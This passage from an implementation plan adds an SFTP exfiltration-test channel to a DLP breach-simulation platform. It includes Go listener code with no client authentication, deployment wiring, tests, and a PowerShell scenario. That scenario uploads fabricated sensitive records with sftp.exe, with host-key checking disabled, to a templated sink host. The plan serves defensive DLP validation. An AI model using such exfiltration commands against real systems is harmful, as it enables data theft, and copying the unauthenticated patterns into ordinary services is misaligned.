func newHostSigner() (ssh.Signer, error) {
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate host key: %w", err)
	}
	return ssh.NewSignerFromKey(priv)
}

// NewListener binds addr (e.g. ":22" in production, "127.0.0.1:0" in
// tests to get an OS-assigned ephemeral port -- read back via
// LocalAddr()) and prepares (but does not yet accept on) the SSH server
// config. db is used to persist completed uploads.
func NewListener(addr string, db *pgxpool.Pool) (*Listener, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("bind %s: %w", addr, err)
	}
	signer, err := newHostSigner()
	if err != nil {
		_ = ln.Close()
		return nil, err
	}
	cfg := &ssh.ServerConfig{NoClientAuth: true}
	cfg.AddHostKey(signer)
	l := &Listener{
		ln:        ln,
		sshConfig: cfg,
		db:        db,
		limiter:   newRateLimiter(rateLimitPerSecond, time.Second),
	}
	l.setStatus(Status{State: "running", Bind: ln.Addr().String()})
	return l, nil
}

// LocalAddr returns the actual bound address. Only valid when Status()
// reports "running".
func (l *Listener) LocalAddr() net.Addr { return l.ln.Addr() }

// Close releases the TCP listener. Only valid when Status() reports
// "running".
func (l *Listener) Close() error { return l.ln.Close() }

// Serve accepts connections until ctx is cancelled or Close is called.
// Meant to be run in its own goroutine by the caller, matching
// internal/dnssink.Listener.Serve's identical shape.
func (l *Listener) Serve(ctx context.Context) {
	go func() {
		<-ctx.Done()
		_ = l.ln.Close()
	}()
	for {
		conn, err := l.ln.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return // expected: context cancelled, listener closed above
			}
			continue // transient accept error, keep serving
		}
		go l.handleConn(conn)
	}
}

func (l *Listener) handleConn(conn net.Conn) {
	defer conn.Close()
	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		host = conn.RemoteAddr().String()
	}
	if !l.limiter.allow(host) {
		return
	}
	if !l.acquireSession() {
		return // at maxConcurrentSessions -- refuse rather than queue
	}
	defer l.releaseSession()

	_ = conn.SetDeadline(time.Now().Add(idleSessionTimeout))
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, l.sshConfig)
	if err != nil {
		return
	}
	defer sshConn.Close()
	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			_ = newChannel.Reject(ssh.UnknownChannelType, "only session channels are supported")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}
		go l.serveSFTPSubsystem(channel, requests, host)
	}
}

// serveSFTPSubsystem handles one SSH session channel's requests, granting
// only a "subsystem sftp" request and rejecting everything else (shell,
// exec, pty, etc.) -- this listener has no legitimate use for anything
// but the SFTP subsystem.
func (l *Listener) serveSFTPSubsystem(channel ssh.Channel, requests <-chan *ssh.Request, sourceIP string) {
	defer channel.Close()
	for req := range requests {
		isSFTP := req.Type == "subsystem" && len(req.Payload) >= 4 && string(req.Payload[4:]) == "sftp"
		if req.WantReply {
			_ = req.Reply(isSFTP, nil)
		}
		if !isSFTP {
			continue
		}
		handlers := sftp.Handlers{
			FileGet:  rejectReader{},
			FilePut:  writeOnlyHandler{db: l.db, sourceIP: sourceIP},
			FileCmd:  rejectCmder{},
			FileList: rejectLister{},
		}
		server := sftp.NewRequestServer(channel, handlers)
		_ = server.Serve()
		_ = server.Close()
		return
	}
}

func (l *Listener) acquireSession() bool {
	l.sessionsMu.Lock()
	defer l.sessionsMu.Unlock()
	if l.sessions >= maxConcurrentSessions {
		return false
	}
	l.sessions++
	return true
}

func (l *Listener) releaseSession() {
	l.sessionsMu.Lock()
	l.sessions--
	l.sessionsMu.Unlock()
}

// writeOnlyHandler is the only functioning handler this listener
// installs -- it accepts exactly one operation, writing a file named
// <token>.dat, and rejects any path that doesn't match that shape before
// allocating a sessionWriter.
type writeOnlyHandler struct {
	db       *pgxpool.Pool
	sourceIP string
}

func (h writeOnlyHandler) Filewrite(r *sftp.Request) (io.WriterAt, error) {
	token, ok := filenameToken(r.Filepath)
	if !ok {
		return nil, os.ErrPermission
	}
	return newSessionWriter(token, h.db, h.sourceIP), nil
}

// rejectReader/rejectCmder/rejectLister uniformly refuse Get/Cmd(Setstat,
// Rename, Remove, Mkdir, Rmdir, Symlink)/List(List, Stat, Readlink) --
// this listener supports exactly one write-then-close operation and
// nothing else, per the design spec's security-hardening section.
type rejectReader struct{}

func (rejectReader) Fileread(*sftp.Request) (io.ReaderAt, error) { return nil, os.ErrPermission }

type rejectCmder struct{}

func (rejectCmder) Filecmd(*sftp.Request) error { return os.ErrPermission }

type rejectLister struct{}

func (rejectLister) Filelist(*sftp.Request) (sftp.ListerAt, error) { return nil, os.ErrPermission }

// StartListener binds addr and runs Serve in the background, returning
// immediately. If the bind fails, it logs the failure loudly and returns
// a Listener whose Status() reports "failed" with the reason -- matching
// internal/dnssink.StartListener's identical pattern. Never silently
// falls back to a different port.
func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener {
	l, err := NewListener(addr, db)
	if err != nil {
		log.Printf("[sftpsink] FAILED to bind %s: %v -- the SFTP exfiltration channel will not be verifiable until this is resolved", addr, err)
		failed := &Listener{}
		failed.setStatus(Status{State: "failed", Reason: err.Error()})
		return failed
	}
	log.Printf("[sftpsink] listening on %s", l.LocalAddr())
	go l.Serve(ctx)
	return l
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd orchestrator && gofmt -w internal/sftpsink/listener.go && go vet ./internal/sftpsink/... && go test ./internal/sftpsink/... -v -timeout 5m
```

Expected: PASS. If `go vet`/`go build` reports an unused or missing import, fix the import block directly — `pkg/sftp`'s exact `Handlers`/`Request`/`ListerAt` type shapes are stable but should be confirmed against the version `go get` actually resolved (`go doc github.com/pkg/sftp Handlers` if anything doesn't compile as written above).

- [ ] **Step 5: Commit**

```bash
git add orchestrator/internal/sftpsink/listener.go orchestrator/internal/sftpsink/listener_test.go
git commit -m "$(cat <<'EOF'
feat(sftpsink): SSH/SFTP listener with NoClientAuth and write-only handlers

Wires session.go's filename validation and bounded write buffer into a
real TCP socket speaking SSH/SFTP via golang.org/x/crypto/ssh +
github.com/pkg/sftp. NoClientAuth: true means no credential is ever
checked or distributed -- the per-upload filename token (an existing
32-byte sink token) is what correlates an upload to a run. Only Filewrite
is functional; Fileread/Filecmd/Filelist all reject uniformly, since this
listener has no legitimate use for anything but a single write-then-close.
Bounded by a per-source-IP rate limit, a concurrent-session ceiling, and
an idle-session timeout.
EOF
)"
git push
```

---

## Task 4: Config, `main.go`, `docker-compose.yml`, and `install.sh` wiring

**Files:**
- Modify: `orchestrator/config/config.go`
- Modify: `orchestrator/cmd/server/main.go`
- Modify: `packaging/compose/docker-compose.yml` (repo-root path, sibling of `orchestrator/`)
- Modify: `packaging/compose/install.sh` (repo-root path)

**Interfaces:**
- Consumes: `sftpsink.StartListener` (Task 3).
- Produces: `cfg.SFTPSinkEnabled bool` — consumed only within this task's own `main.go` wiring.

- [ ] **Step 1: Add the config field and its env var**

In `orchestrator/config/config.go`, add the field to the `Config` struct, right after `DNSSinkEnabled`:

```go
	// SFTPSinkEnabled controls the SFTP exfiltration listener
	// (internal/sftpsink). Defaults to true for the same reason
	// DNSSinkEnabled does -- a bind failure is logged and reflected in the
	// listener's own Status(), never fatal to the rest of the orchestrator.
	// Env: SFTP_SINK_ENABLED.
	SFTPSinkEnabled bool `json:"sftp_sink_enabled,omitempty"`
```

In `Load`'s defaults struct literal, immediately after `DNSSinkEnabled:   true,`:

```go
		SFTPSinkEnabled:  true,
```

In the environment-variable override section, immediately after the existing `DNS_SINK_ENABLED` block:

```go
	if v := os.Getenv("SFTP_SINK_ENABLED"); v != "" {
		if b, err := strconv.ParseBool(v); err == nil {
			cfg.SFTPSinkEnabled = b
		}
	}
```

- [ ] **Step 2: Wire the listener into `main.go`**

In `orchestrator/cmd/server/main.go`, add the import:

```go
	"github.com/audspect/bas/internal/sftpsink"
```

Immediately after the existing DNS Tunneling Exfiltration Sink block and before `srv := &http.Server{...}`:

```go
	// ── SFTP Exfiltration Sink ────────────────────────────────────────────
	// Third channel of the DLP sink-verification architecture (see
	// docs/superpowers/specs/2026-09-01-sftp-exfiltration-channel-design.md).
	// Independently enable/disable-able; a bind failure is logged and
	// reflected in Status(), never fatal to the rest of the orchestrator.
	if cfg.SFTPSinkEnabled {
		sftpsink.StartListener(context.Background(), ":22", pool)
	} else {
		log.Println("[sftpsink] disabled via SFTP_SINK_ENABLED=false")
	}
```

- [ ] **Step 3: Add the compose port mapping**

In `packaging/compose/docker-compose.yml`, add the SFTP port mapping to the `orchestrator` service's `ports:` block, alongside the existing `53:53/udp` entry:

```yaml
    ports:
      - "${BAS_PORT:-9443}:9443"
      - "53:53/udp"
      - "${SINK_SFTP_PORT:-2222}:22/tcp"
```

(`NET_BIND_SERVICE` under `cap_add` is already present from the DNS channel's own requirement — container-internal port 22 needs it exactly like port 53 did, no new capability to add.)

Add `SFTP_SINK_ENABLED` and `SINK_SFTP_HOST` to the `environment:` block, immediately after the existing `DNS_SINK_ENABLED` line:

```yaml
      DNS_SINK_ENABLED: ${DNS_SINK_ENABLED:-true}
      SFTP_SINK_ENABLED: ${SFTP_SINK_ENABLED:-true}
      SINK_SFTP_HOST: ${SINK_SFTP_HOST:-}
      SINK_SFTP_PORT: ${SINK_SFTP_PORT:-2222}
```

- [ ] **Step 4: Add `SINK_SFTP_PORT` validation to `install.sh`**

In `packaging/compose/install.sh`, add the variable declaration near the other optional vars (immediately after the existing `AGENT_SECRET=""` line):

```bash
SINK_SFTP_PORT=""
SINK_SFTP_HOST=""
```

Add the case-statement entries for `setup.conf` parsing, immediately after the existing `AGENT_SECRET)            AGENT_SECRET="$val"            ;;` line:

```bash
      SINK_SFTP_PORT)          SINK_SFTP_PORT="$val"          ;;
      SINK_SFTP_HOST)          SINK_SFTP_HOST="$val"          ;;
```

Add the default and the port-22 rejection, in the required-field validation block, immediately after the existing `DNS_SINK_BIND_IP` check:

```bash
  [[ -z "$SINK_SFTP_PORT" ]] && SINK_SFTP_PORT="2222"
  [[ "$SINK_SFTP_PORT" == "22" ]] && { err "setup.conf: SINK_SFTP_PORT must not be 22 -- this collides with the deployment host's own sshd. Leave unset for the default (2222) or choose a different unused host port."; exit 1; }
```

Add both values to the generated `.env` heredoc, immediately after the existing `AGENT_SECRET=${AGENT_SECRET}` line:

```bash
SINK_SFTP_PORT=${SINK_SFTP_PORT}
SINK_SFTP_HOST=${SINK_SFTP_HOST}
```

- [ ] **Step 5: Syntax-check `install.sh` and build/test the touched Go packages**

```bash
bash -n packaging/compose/install.sh && echo "SYNTAX OK"
cd orchestrator && go build ./... && go test ./internal/sftpsink/... ./config/... -v -timeout 5m
```

Expected: `SYNTAX OK`, clean build, all tests PASS.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/config/config.go orchestrator/cmd/server/main.go packaging/compose/docker-compose.yml packaging/compose/install.sh
git commit -m "$(cat <<'EOF'
feat(deploy): wire the SFTP sink into startup, compose, and install.sh

SFTPSinkEnabled defaults to true, same rationale as DNSSinkEnabled --
bind failure is always logged and visible in Status(), never fatal.
docker-compose.yml publishes ${SINK_SFTP_PORT:-2222}:22/tcp -- the
listener itself binds container-internal :22 (genuine SSH/SFTP wire
protocol), but the host-published port is the separate, configurable
2222 default so it never collides with the deployment host's own sshd
on port 22. install.sh validates SINK_SFTP_PORT is never explicitly set
to 22, failing loudly rather than allowing a value that would break the
host's real SSH access.
EOF
)"
git push
```

---

## Task 5: Placeholder substitution + regression proof

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`
- Test only (no modification expected): `orchestrator/internal/reporting/dlp_test.go`, `orchestrator/internal/verifysync/job_test.go`

**Interfaces:**
- Consumes: `generateSinkToken(32)` (existing, unchanged); `dnsServerHost` (existing, unchanged).
- Produces: SFTP-aware `issueSinkTokensAndSubstitute` — consumed by `dispatchRun` (already wired to call this function; no further changes needed there since its call signature is unchanged).

- [ ] **Step 1: Write the failing test**

Add to `orchestrator/internal/api/dlp_sink_test.go`:

```go
func TestIssueSinkTokensAndSubstitute_SFTPPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "sftp -P {{SINK_SFTP_PORT}} dlptest@{{SINK_SFTP_HOST}} <<< 'put file {{SINK_TOKEN}}.dat'"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SFTP_HOST}}") || strings.Contains(cmd, "{{SINK_SFTP_PORT}}") {
			t.Fatalf("SFTP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_SFTP_HOST must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, "2222") {
			t.Fatalf("expected the default SINK_SFTP_PORT (2222) in the command: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-sftp-1' AND technique_id = 'T1048.002'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (SFTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SFTPHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_SFTP_HOST", "sftp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.002", Command: "target={{SINK_SFTP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-sftp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "sftp-external.example.net") {
			t.Fatalf("expected the SINK_SFTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run "TestIssueSinkTokensAndSubstitute_SFTP" -v`
Expected: FAIL — SFTP placeholders not substituted (still present in the command string).

- [ ] **Step 3: Implement the SFTP substitution path**

In `orchestrator/internal/api/dlp_sink.go`, modify `issueSinkTokensAndSubstitute`'s loop body to also handle the SFTP placeholder set, right after the existing `{{SINK_DNS_CAMPAIGN_ID}}` block:

```go
		if strings.Contains(steps[i].Command, "{{SINK_SFTP_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_SFTP_PORT}}") {
			token, err := generateSinkToken(32)
			if err != nil {
				return nil, err
			}
			expiresAt := time.Now().Add(sinkTokenTTL)
			if _, err := h.db.Exec(ctx,
				`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
				token, runID, steps[i].TechniqueID, expiresAt,
			); err != nil {
				return nil, fmt.Errorf("persist sftp sink token: %w", err)
			}
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_TOKEN}}", token)
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_SFTP_HOST}}", sftpSinkHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_SFTP_PORT}}", sftpSinkPort())
		}
```

(A step wired to SFTP still uses the `{{SINK_TOKEN}}` placeholder like the HTTP channel does — reusing the existing 32-byte token path directly rather than the DNS channel's separate 8-byte variant, per the design spec's Decisions section. This block issues its own token rather than relying on the earlier `{{SINK_TOKEN}}` block above it, since a step's command containing only `{{SINK_SFTP_HOST}}`/`{{SINK_SFTP_PORT}}` — with `{{SINK_TOKEN}}` elsewhere in the same command string — would otherwise never trigger the first block's `strings.Contains(steps[i].Command, "{{SINK_TOKEN}}")` check independently; this mirrors exactly how the DNS block above it is already self-contained rather than depending on the HTTP block's own token issuance.)

Add the two helper functions after the existing `dnsServerHost` function:

```go
// sftpSinkHost resolves the {{SINK_SFTP_HOST}} placeholder: an explicit
// SINK_SFTP_HOST environment override if set (for deployments where the
// externally reachable SFTP address differs from publicBaseURL's host,
// e.g. behind NAT), otherwise the same derivation dnsServerHost already
// uses -- no new derivation logic.
func sftpSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_SFTP_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}

// sftpSinkPort resolves the {{SINK_SFTP_PORT}} placeholder: the
// configured SINK_SFTP_PORT (the host-published port an external client
// actually connects to, NOT the container-internal :22 the listener
// itself binds), defaulting to 2222 if unset.
func sftpSinkPort() string {
	if v := os.Getenv("SINK_SFTP_PORT"); v != "" {
		return v
	}
	return "2222"
}
```

Add `"os"` to the import block if not already present (`internal/api/dlp_sink.go` currently imports `net`, `net/http`, `net/url` among others — check the existing import list and add `"os"` alongside them if missing).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run "TestIssueSinkTokensAndSubstitute_SFTP" -v`
Expected: PASS.

- [ ] **Step 5: Prove `internal/verifysync` and `internal/reporting` need no changes beyond Task 1's fix**

```bash
cd orchestrator && go test ./internal/verifysync/... ./internal/reporting/... -v -timeout 10m
```

Expected: PASS — every existing test, including all three new `TestDLPVerifier_SkipMarker*`/`TestDLPVerifier_NoSkipMarker*` tests from Task 1. `internal/verifysync.annotateSinkReceipts` already keys purely on "does a `dlp_sink_receipts` row exist for this token" — `sftpsink`'s `Close()` (Task 2) writes into the exact same table with the exact same shape, so this package needs zero further changes.

- [ ] **Step 6: Run the full `internal/api` and `internal/sftpsink` suites**

```bash
cd orchestrator && go test ./internal/api/... ./internal/sftpsink/... -v -timeout 20m > <scratchpad>/sftp_task5_full.log 2>&1
```

Use `Monitor` to watch for the `ok`/`FAIL` line, then read the full log and confirm zero `--- FAIL` lines.

- [ ] **Step 7: Commit**

```bash
git add orchestrator/internal/api/dlp_sink.go orchestrator/internal/api/dlp_sink_test.go
git commit -m "$(cat <<'EOF'
feat(api): SFTP sink placeholder substitution

Adds {{SINK_SFTP_HOST}}/{{SINK_SFTP_PORT}} handling to
issueSinkTokensAndSubstitute, reusing the existing 32-byte {{SINK_TOKEN}}
path unchanged -- SFTP has no DNS-style label-length constraint, so no
new token byte-length variant is needed. sftpSinkHost reuses
dnsServerHost's existing derivation with an optional SINK_SFTP_HOST
override for NAT'd deployments; sftpSinkPort resolves the configured
host-published port (default 2222), not the container-internal :22 the
listener itself binds. Regression-tested that internal/verifysync and
internal/reporting need zero further changes beyond Task 1's skip:
marker fix -- both already key purely on "does a dlp_sink_receipts row
exist for this token," which sftpsink's Close() now also satisfies.
EOF
)"
git push
```

---

## Task 6: V1 scenario content

**Files:**
- Create: `scenarios/dlp-exfiltration-sftp.yaml` (repo-root path, sibling of `orchestrator/`)
- Create: `scenarios/dlp-exfiltration-sftp.yaml.sig`
- Modify: `scenarios/detection-profiles/windows_dlp_exfiltration.yaml`

**Interfaces:**
- Consumes: `{{SINK_TOKEN}}`/`{{SINK_SFTP_HOST}}`/`{{SINK_SFTP_PORT}}` placeholder substitution (Task 5); the `windows_dlp_exfiltration` detection profile's existing structure.

- [ ] **Step 1: Add the new scenario file**

The MITRE technique is **T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol**, confirmed against this repo's own bundled ATT&CK enrichment data (`orchestrator/internal/reporting/attackdata/attack_enrichment.json:4162`) — SFTP (SSH-encrypted file transfer) falls under this sub-technique of T1048 Exfiltration Over Alternative Protocol.

Create `scenarios/dlp-exfiltration-sftp.yaml`:

```yaml
id: dlp-exfiltration-sftp
name: DLP Exfiltration Validation — SFTP Channel
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by dlp-exfiltration-validation.yaml, dlp-exfiltration-sink-https.yaml,
  and dlp-exfiltration-dns-tunnel.yaml (fabricated PAN, Aadhaar, SWIFT/BIC,
  UPI VPA, and credit-card patterns), this time via SFTP -- a real
  file-transfer protocol over its own TCP/SSH session, distinct from both
  the HTTP-body and DNS-query-label channels already covered.

  Third channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-09-01-sftp-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own purpose-built SFTP
  listener (internal/sftpsink) ever receives the uploaded file -- ground
  truth for whether the data left via SFTP, not an inference from a local
  check. Uses only the Windows-native OpenSSH Client (sftp.exe); if it is
  not present on the endpoint, the step reports an environmental SKIPPED
  result rather than a DLP verdict -- a missing client tool is never
  evidence that DLP blocked anything.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The SFTP listener stores only a hash of the uploaded payload,
  never the raw content, and it is deliberately unauthenticated
  (NoClientAuth) -- it exists to test whether content/protocol inspection
  catches the transfer, not to test access control. The destination is
  this same on-prem orchestrator; no external SFTP server is ever
  contacted. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - sftp
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:
  - name: "DLP Validation — SFTP Exfiltration (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a single small file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). No real SFTP server is contacted and no data leaves the environment -- the destination is this same on-prem deployment. If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $tempFile = New-TemporaryFile
      Set-Content -Path $tempFile -Value $csvContent -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""
```

- [ ] **Step 2: Add the detection-profile entry**

In `scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, update the `technique_ids` line to add `T1048.002`:

```yaml
technique_ids: [T1052, T1052.001, T1074.001, T1115, T1560.001, T1567, T1071.004, T1048.002]
```

Append a new `expected_detection` entry after the existing `dlp-dns-tunnel-block` entry (the file's current last entry):

```yaml
  - id: dlp-sftp-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/network controls did not block SFTP exfiltration of regulated data"
      remediation: >-
        Confirm DLP/network inspection covers outbound SFTP/SSH file
        transfers for PAN/Aadhaar/SWIFT/UPI/credit-card patterns,
        independent of HTTP-based content inspection -- a missing
        sftp.exe on the endpoint resolves to a skipped (not evaluable)
        result, not a passing control.
      reference: "MITRE ATT&CK T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
```

- [ ] **Step 3: Sign the new scenario file and re-sign the modified profile**

From the `orchestrator` directory:

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-sftp.yaml
go run scripts/signer.go sign private_key.pem ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

Confirm both `.sig` files exist/were updated: `ls -la ../scenarios/dlp-exfiltration-sftp.yaml.sig ../scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`.

- [ ] **Step 4: Confirm the scenario loads and signature-verifies against the real scenarios directory**

Write a throwaway test (do not leave it committed — matching the exact same technique already used and deleted for the HTTPS and DNS channels):

Create `orchestrator/internal/scenario/zzz_verify_sftp_load_test.go`:

```go
package scenario

import "testing"

func TestZZZVerifySFTPScenarioLoadsFromRealDir(t *testing.T) {
	e := NewEngine("../../../scenarios")
	if err := e.Load(); err != nil {
		t.Fatalf("Load: %v", err)
	}
	sc, ok := e.Get("dlp-exfiltration-sftp")
	if !ok {
		t.Fatalf("dlp-exfiltration-sftp not present in loaded scenarios map (parse error or signature verification failure -- check test log output above)")
	}
	if sc.Source != "builtin" {
		t.Errorf("Source = %q, want builtin", sc.Source)
	}
	if len(sc.Steps) != 1 {
		t.Errorf("Steps = %d, want 1", len(sc.Steps))
	}
}
```

Run: `cd orchestrator && go test ./internal/scenario/... -run TestZZZVerifySFTPScenarioLoadsFromRealDir -v -timeout 1m`
Expected: PASS.

Then delete the throwaway file: `rm orchestrator/internal/scenario/zzz_verify_sftp_load_test.go` (never committed).

- [ ] **Step 5: Run the full `internal/scenario` suite**

Run: `cd orchestrator && go test ./internal/scenario/... -v -timeout 5m`
Expected: PASS — every test in the package, confirming the new signed scenario and re-signed profile load cleanly alongside every existing built-in.

- [ ] **Step 6: Commit**

```bash
git add scenarios/dlp-exfiltration-sftp.yaml scenarios/dlp-exfiltration-sftp.yaml.sig scenarios/detection-profiles/windows_dlp_exfiltration.yaml scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "$(cat <<'EOF'
feat(scenarios): SFTP DLP exfiltration channel

Third sink-verified channel: uploads the same synthetic regulated-data
record the HTTPS/DNS channels use via sftp.exe (Windows-native OpenSSH
Client, never installed or bundled), verified by whether
internal/sftpsink's listener ever receives it. A missing sftp.exe
resolves to skip:, which Task 1's dlpVerifier fix correctly keeps out of
the Blocked verdict. Standalone scenario file, matching the HTTPS/DNS
channels' precedent of keeping each verification model in its own file.
EOF
)"
git push
```

---

## Task 7: Full verification and handoff

**Files:** none (verification only)

- [ ] **Step 1: Run the full `internal/api`, `internal/sftpsink`, `internal/reporting`, `internal/verifysync`, `internal/scenario`, and `config` suites together**

```bash
cd orchestrator && go test ./internal/api/... ./internal/sftpsink/... ./internal/reporting/... ./internal/verifysync/... ./internal/scenario/... ./config/... -v -timeout 20m > <scratchpad>/sftp_final.log 2>&1
```

Use `Monitor` to watch for completion, then read the actual full log file and confirm every test passes with zero `--- FAIL` lines.

- [ ] **Step 2: Run the broader build**

Run: `cd orchestrator && go build ./...`
Expected: no errors.

- [ ] **Step 3: gofmt check**

Run: `cd orchestrator && gofmt -l internal/sftpsink internal/api/dlp_sink.go internal/api/dlp_sink_test.go internal/reporting/dlp.go internal/reporting/dlp_test.go config/config.go cmd/server/main.go`
Expected: no output (every file this plan touched is gofmt-clean). If any file is listed, run `gofmt -w` on it and re-verify tests still pass.

- [ ] **Step 4: No frontend changes needed**

This plan does not touch `wwwroot/index.html` — matching the HTTPS and DNS sub-projects' precedent, nothing in this plan's tasks requires a UI change. The SFTP listener's health is queryable server-side (a future `Status()`-consuming view could be added later, same as DNS's), but no frontend work ships in this sub-project.

- [ ] **Step 5: Announce completion and hand off**

